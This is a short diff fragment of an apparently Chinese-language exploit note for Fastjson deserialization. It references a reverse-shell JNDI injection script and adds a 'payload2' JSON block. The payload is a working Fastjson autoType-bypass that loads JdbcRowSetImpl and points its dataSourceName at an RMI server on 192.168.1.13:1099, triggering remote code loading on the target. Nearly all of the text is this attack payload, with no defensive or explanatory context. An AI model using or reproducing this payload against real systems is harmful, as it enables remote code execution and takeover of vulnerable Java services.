@@ -12,3 +12,20 @@ Content-Type: application/json
 ```
 
 使用 web_exp_reverse_shell_fastjson_jndi_JNDI-Injection-Exploit_fast.py
+
+
+# payload2
+
+```json
+{
+ "1": {
+ "@type": "java.lang.Class", 
+ "val": "com.sun.rowset.JdbcRowSetImpl"
+ }, 
+ "2": {
+ "@type": "com.sun.rowset.JdbcRowSetImpl", 
+ "dataSourceName": "rmi://192.168.1.13:1099/v4v9uh", 
+ "autoCommit": true
+ }
+}
+```
